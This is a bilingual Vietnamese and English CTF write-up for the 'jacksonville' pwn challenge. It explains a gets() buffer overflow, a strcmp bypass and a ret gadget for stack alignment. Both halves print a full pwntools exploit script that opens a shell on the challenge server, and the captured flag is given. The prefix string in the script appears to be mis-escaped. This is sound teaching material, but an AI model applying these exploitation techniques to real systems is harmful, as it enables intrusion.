# Sunshine CTF 2025 — Jacksonville

**Thể loại:** Pwnable / Binary Exploitation

**Độ khó:** Dễ đến Trung bình

---

## Tổng quan thử thách

Thử thách cung cấp một file thực thi ELF 64-bit tên là `jacksonville`. Khi chạy, chương trình yêu cầu người dùng nhập vào tên đội bóng bầu dục Florida tuyệt vời nhất. Phân tích sâu hơn cho thấy chương trình chứa một lỗ hổng tràn bộ đệm kinh điển trong hàm `gets()`. Ngoài ra, một hàm "win" ẩn chứa backdoor đã được tác giả để lại. Tuy nhiên, việc khai thác không hề đơn giản do một yêu cầu logic so sánh chuỗi và một "cái bẫy" liên quan đến việc căn chỉnh stack trên các hệ thống Linux hiện đại.

---

## Mục tiêu

Mục tiêu chính là chiếm quyền điều khiển luồng thực thi của chương trình để nhảy đến hàm `win()` ẩn, hàm này sẽ thực thi `system("/bin/sh")` và cho chúng ta một shell trên server để có thể đọc được file `flag.txt`.

---

## Kiến thức cần thiết

Để giải quyết thử thách này, người chơi cần có kiến thức về:

- **Phân tích file nhị phân:** Sử dụng các công cụ như `file`, `strings`, `nm`, `objdump`, và `gdb` để hiểu cấu trúc và hành vi của một file ELF.
- **Tràn bộ đệm trên Stack (Stack Buffer Overflow):** Hiểu cách hàm `gets()` có thể bị lợi dụng để ghi đè lên các dữ liệu được lưu trên stack, bao gồm cả địa chỉ trả về (return address).
- **Lập trình hướng trả về (Return-Oriented Programming - ROP):** Khái niệm cơ bản về việc xây dựng các chuỗi ROP (ROP chains) để điều khiển luồng thực thi.
- **Quy ước gọi hàm System V AMD64 ABI:** Đặc biệt là yêu cầu căn chỉnh stack 16-byte trước khi gọi các hàm trong `libc` (như `system`).
- **Lập trình với `pwntools`:** Sử dụng thư viện Python `pwntools` để tự động hóa quá trình tương tác và gửi payload khai thác.

---

## Phân tích và hướng tiếp cận

1. **Phân tích ban đầu:**
    - `checksec jacksonville` cho thấy chương trình không có canary bảo vệ stack (`No canary found`) và không bật PIE (`No PIE`), tạo điều kiện lý tưởng cho một cuộc tấn công buffer overflow.
    - `strings` và `nm` tiết lộ sự tồn tại của một hàm `win()` ở địa chỉ `0x4011f6`, hàm này gọi `system("/bin/sh")`. Đây chính là mục tiêu của chúng ta.
2. **Phân tích lỗ hổng trong GDB:**
    - Disassembly hàm `vuln` cho thấy nó sử dụng `gets()` để đọc input vào một buffer có kích thước `0x60` (96 bytes) trên stack. Đây chính là lỗ hổng.
    - Sau `gets()`, có một đoạn mã so sánh input của người dùng với chuỗi `"Jaguars"`. Tuy nhiên, nó không so sánh từ đầu, mà từ vị trí `buffer + 6`. Nếu so sánh thất bại, chương trình sẽ gọi `exit()`, khiến cho payload ghi đè địa chỉ trả về của chúng ta trở nên vô dụng.
    - **Yêu cầu 1:** Payload phải chứa chuỗi `"Jaguars\\x00"` bắt đầu từ byte thứ 7 để vượt qua `strcmp`.
3. **Xác định Offset:**
    - Buffer có kích thước `0x60` (96 bytes). Cộng thêm 8 bytes của `saved rbp`, offset để ghi đè lên địa chỉ trả về là **104 bytes**.
4. **Phát hiện "Cái bẫy" Căn chỉnh Stack:**
    - Một payload đơn giản nhảy thẳng đến hàm `win()` hoạt động trên một số môi trường local nhưng lại gây crash (dẫn đến `EOFError`) trên server của cuộc thi.
    - Nguyên nhân là do các phiên bản `libc` hiện đại yêu cầu stack phải được căn chỉnh 16-byte trước khi gọi các hàm như `system()`. Lệnh `call` từ `main` đến `vuln` đã làm stack bị lệch đi 8 bytes.
    - **Yêu cầu 2:** Chúng ta cần sửa lại việc căn chỉnh stack trước khi nhảy đến hàm `win`.
5. **Xây dựng ROP Chain:**
    - Để sửa lỗi căn chỉnh, chúng ta sẽ thêm một gadget `ret` vào ROP chain. Lệnh `ret` đầu tiên (ở cuối hàm `vuln`) sẽ nhảy đến gadget `ret` này.
    - Việc thực thi gadget `ret` sẽ pop 8 bytes khỏi stack, làm cho con trỏ stack (`RSP`) quay trở lại một ranh giới 16-byte.
    - Lệnh `ret` thứ hai (chính là gadget) sẽ nhảy đến địa chỉ của hàm `win()`.

---

## Kịch bản khai thác (Exploit)

Script `pwntools` sau đây sẽ xây dựng và gửi đi payload hoàn chỉnh để giải quyết thử thách.

```python
# solve.py
from pwn import *

# Cài đặt môi trường
elf = ELF("./jacksonville")
context.binary = elf

# Kết nối tới server
p = remote("chal.sunshinectf.games", 25602)

# Chờ đợi prompt ban đầu của chương trình
p.recvuntil(b"> ")

# Tìm một gadget "ret" đơn giản để căn chỉnh stack.
# Có thể tìm bằng ROPgadget hoặc dùng một địa chỉ hợp lệ như đầu hàm _init
ret_gadget = 0x40101a

# Xây dựng payload
# 1. Prefix để bypass strcmp (6 byte đệm + "Jaguars" + null byte)
prefix = b"A" * 6 + b"Jaguars\\0"

# 2. Padding để điền đầy đến địa chỉ trả về
# Offset tổng là 104.
padding = b"B" * (104 - len(prefix))

# 3. ROP Chain
# - Gadget "ret" để sửa lỗi căn chỉnh stack
# - Địa chỉ của hàm win
rop_chain = p64(ret_gadget) + p64(elf.symbols["win"])

# Ghép tất cả lại
payload = prefix + padding + rop_chain

# Gửi payload
p.sendline(payload)

# Chuyển sang chế độ tương tác để điều khiển shell
p.interactive()

```

**Kết quả (Flag)**

Sau khi chạy script, chúng ta sẽ nhận được một shell trên server. Dùng các lệnh `ls -la` và `cat flag.txt`, chúng ta có thể đọc được flag.

`sun{It4chI_b3ats_0b!to_nO_d!ff}`

---

## Ghi chú và mẹo

- Vấn đề căn chỉnh stack là một "cái bẫy" phổ biến trong các bài pwnable 64-bit. Khi một ROP chain đơn giản không hoạt động trên remote mặc dù đã đúng ở local, đây nên là một trong những nguyên nhân đầu tiên cần kiểm tra.
- Luôn phân tích kỹ luồng logic của chương trình. Việc bỏ qua điều kiện `strcmp` ban đầu sẽ dẫn đến việc chương trình gọi `exit()` và làm cho mọi nỗ lực khai thác thất bại.
- Sử dụng `pwntools` và GDB là bộ công cụ cực kỳ mạnh mẽ để gỡ lỗi và phát triển payload một cách hiệu quả.

---

# ENGLISH VERSION

**Category:** Pwnable / Binary Exploitation

**Difficulty:** Easy to Medium

---

## Challenge Overview

The challenge provides a 64-bit ELF executable named `jacksonville`. When run, it prompts the user to enter the best Florida football team. A deeper analysis reveals a classic stack-based buffer overflow vulnerability in the `gets()` function. Additionally, a hidden "win" function, acting as a backdoor, was left by the author. However, exploitation is not straightforward due to a string comparison logic check and a subtle trap related to stack alignment on modern Linux systems.

---

## Objective

The main goal is to hijack the program's control flow to jump to the hidden `win()` function, which executes `system("/bin/sh")`. This provides a shell on the remote server, allowing us to read the `flag.txt` file.

---

## Required Knowledge

To solve this challenge, players need knowledge of:

- **Binary Analysis:** Using tools like `file`, `strings`, `nm`, `objdump`, and `gdb` to understand the structure and behavior of an ELF file.
- **Stack Buffer Overflow:** Understanding how the `gets()` function can be exploited to overwrite data on the stack, including the saved return address.
- **Return-Oriented Programming (ROP):** Basic concepts of building ROP chains to control program execution.
- **System V AMD64 ABI:** Specifically, the 16-byte stack alignment requirement before calling functions in `libc` (like `system`).
- **Scripting with `pwntools`:** Using the Python `pwntools` library to automate interaction and exploit payload delivery.

---

## Analysis and Approach

1. **Initial Analysis:**
    - `checksec jacksonville` reveals `No canary found` and `No PIE`, creating ideal conditions for a buffer overflow attack.
    - `strings` and `nm` uncover the existence of a `win()` function at address `0x4011f6`, which calls `system("/bin/sh")`. This is our target.
2. **Vulnerability Analysis in GDB:**
    - Disassembling the `vuln` function shows it uses `gets()` to read user input into a `0x60` (96-byte) buffer on the stack, which is the vulnerability.
    - After `gets()`, a code block compares the user input with the string `"Jaguars"`. However, the comparison doesn't start from the beginning of the buffer but from `buffer + 6`. If this comparison fails, the program calls `exit()`, rendering our return address overwrite useless.
    - **Requirement 1:** The payload must contain the string `"Jaguars\\x00"` starting at the 7th byte to pass the `strcmp` check.
3. **Determining the Offset:**
    - The buffer size is `0x60` (96 bytes). Adding the 8 bytes for the saved `rbp`, the offset to overwrite the return address is **104 bytes**.
4. **Discovering the Stack Alignment Trap:**
    - A simple payload that jumps directly to `win()` works in some local environments but crashes (resulting in an `EOFError`) on the remote challenge server.
    - The cause is that modern `libc` versions require the stack to be 16-byte aligned before calling functions like `system()`. The `call` from `main` to `vuln` misaligns the stack by 8 bytes.
    - **Requirement 2:** We need to fix the stack alignment before jumping to the `win` function.
5. **Building the ROP Chain:**
    - To fix the alignment, we add a simple `ret` gadget to our ROP chain. The first `ret` (at the end of `vuln`) will jump to this `ret` gadget.
    - The execution of the `ret` gadget pops 8 bytes from the stack, moving the stack pointer (`RSP`) back to a 16-byte boundary.
    - The second `ret` (the gadget itself) will then jump to the address of the `win()` function.

---

## Exploit Script

The following `pwntools` script builds and sends the final payload to solve the challenge.

```python
# solve.py
from pwn import *

# Set up the environment
elf = ELF("./jacksonville")
context.binary = elf

# Connect to the remote server
p = remote("chal.sunshinectf.games", 25602)

# Receive the initial prompt
p.recvuntil(b"> ")

# Find a simple "ret" gadget for stack alignment.
# Can be found with ROPgadget or by using a valid address like the start of _init
ret_gadget = 0x40101a

# Build the payload
# 1. Prefix to bypass strcmp (6 bytes of junk + "Jaguars" + null byte)
prefix = b"A" * 6 + b"Jaguars\\0"

# 2. Padding to fill up to the return address
# Total offset is 104.
padding = b"B" * (104 - len(prefix))

# 3. ROP Chain
# - "ret" gadget to fix stack alignment
# - Address of the win function
rop_chain = p64(ret_gadget) + p64(elf.symbols["win"])

# Combine all parts
payload = prefix + padding + rop_chain

# Send the payload
p.sendline(payload)

# Switch to interactive mode to control the shell
p.interactive()

```

**Result (Flag)**

After running the script, we get a shell on the remote server. By using `ls -la` and `cat flag.txt`, we can retrieve the flag.

`sun{It4chI_b3ats_0b!to_nO_d!ff}`

---

## Postmortem / Tips

- The stack alignment issue is a common trap in 64-bit pwnable challenges. When a simple ROP chain fails on remote despite working locally, this should be one of the first potential causes to investigate.
- Always analyze the program's logic flow carefully. Overlooking the `strcmp` condition would initially lead to the program calling `exit()`, thwarting all exploit attempts.
- Using `pwntools` and GDB is an extremely powerful combination for efficiently debugging and developing exploit payloads.
